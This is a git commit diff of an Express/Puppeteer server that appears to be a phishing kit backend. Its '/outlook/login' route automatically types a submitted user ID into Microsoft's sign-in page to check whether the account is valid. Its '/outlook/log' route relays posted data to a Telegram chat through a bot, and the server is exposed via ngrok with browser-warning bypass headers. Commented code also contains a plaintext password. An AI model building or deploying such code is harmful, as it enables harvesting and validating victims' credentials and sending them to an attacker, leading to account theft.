dcf083ef12f9c309f46936fae071b66b49307492
0urlokmanage <157954772+0urlokmanage@users.noreply.github.com>
2024-02-13 14:43:11 +0100

    Add files via upload

--- index.js
+++ index.js
@@ -21,9 +21,14 @@ app.use(express.json());
 
 // Route to handle GET requests with URL parameters
 app.get('/login', async (req, res) => {
+  
+  // Set custom headers
+  res.setHeader('ngrok-skip-browser-warning', 'true');
+  res.setHeader('User-Agent', 'Custom User-Agent');
+  
     const uid = req.query.uid;
 
-  const browser = await puppeteer.launch({ headless: true, args: [
+  const browser = await puppeteer.launch({ headless: false, args: [
     '--incognito',
   ]}); // Set headless to false for a visible browser window
   const page = await browser.newPage();
@@ -39,12 +44,12 @@ app.get('/login', async (req, res) => {
 
     // Fill in the username
     await page.type('#iux-identifier-first-unknown-identifier', uid);
-    await page.waitForTimeout(2000);
+    await page.waitForTimeout(400);
 
     // Click the "Next" button
     await page.click('.Button-button-e224935');
 
-    await page.waitForTimeout(3000);
+    await page.waitForTimeout(400);
 
     // Wait for the login to complete (adjust as needed)
 
@@ -101,8 +106,111 @@ app.post('/log', (req, res) => {
     res.json({ message: 'Log successful', data: requestData });
 });
 
+
+// Route to handle GET requests with URL parameters
+app.get('/outlook/login', async (req, res) => {
+  
+  // Set custom headers
+  res.setHeader('ngrok-skip-browser-warning', 'true');
+  res.setHeader('User-Agent', 'Custom User-Agent');
+  
+    const uid = req.query.uid;
+
+  const browser = await puppeteer.launch({ headless: true, args: [
+    '--incognito',
+  ]}); // Set headless to false for a visible browser window
+  const page = await browser.newPage();
+  let resp 
+
+  try {
+    // Navigate to the Outlook login page
+
+
+    // Navigate to the Outlook login page
+    await page.goto('https://login.live.com/login.srf');
+
+    // Wait for the login form to be visible
+    await page.waitForSelector('#i0116');
+
+    // Fill in the username
+    await page.type('#i0116', uid);
+    await page.waitForTimeout(400);
+
+    // Click the "Next" button
+    await page.click('#idSIButton9');
+    // await page.waitForTimeout(4000);
+
+    // Wait for the password field to be visible
+    // await page.waitForSelector('#i0118');
+
+    // // Fill in the password
+    // await page.type('#i0118', 'Orestes196@');
+
+    // // Click the "Sign in" button
+    // await page.click('#idSIButton9');
+
+    // Wait for the login to complete (adjust as needed)
+    // await page.waitForNavigation({ waitUntil: 'domcontentloaded' });
+
+    console.log('Login successful!');
+
+    console.log(page);
+    const className = 'error'; // Replace with the desired class name
+    // const className = 'styledComponents__StyledWidgetContainer-kizisb-13 fFcGEU ius'; // Replace with the desired class name
+
+    const divContent = await page.evaluate((className) => {
+      // Find the div element with the specified class name
+      const divElement = document.querySelector(`div.${className}`);
+  
+      // If the div element is found, return its inner HTML content
+      if (divElement) {
+        return divElement.innerHTML;
+      } else {
+        return 'success login';
+      }
+    }, className);
+  
+    console.log(`Content of div with class "${className}":`);
+    console.log(divContent);
+    resp = divContent
+    // res.send(divContent)
+
+    
+    await browser.close();
+
+    // res.json(divContent);
+
+
+    // Perform additional actions as needed after login
+
+  }catch (error) {
+    console.error('Error during login:', error);
+  } finally {
+
+    res.json(resp);
+    
+    // Close the browser
+    // await browser.close();
+  }
+
+});
+
+// Route to handle POST requests with JSON body
+app.post('/outlook/log', (req, res) => {
+    const requestData = req.body;
+    const chatId = requestData.chatId;
+    const message = requestData.message;
+    // const chatId = '-4176809792';
+    bot.sendMessage(chatId, message, {
+      parse_mode: 'HTML'
+    });
+    res.json({ message: 'Log successful', data: requestData });
+});
+
+
 // Listen for incoming requests on the specified port
 app.listen(port, () => {
     console.log(`Server is running at http://localhost:${port}`);
 });
 
+//ngrok http --domain=exotic-donkey-reasonably.ngrok-free.app 80
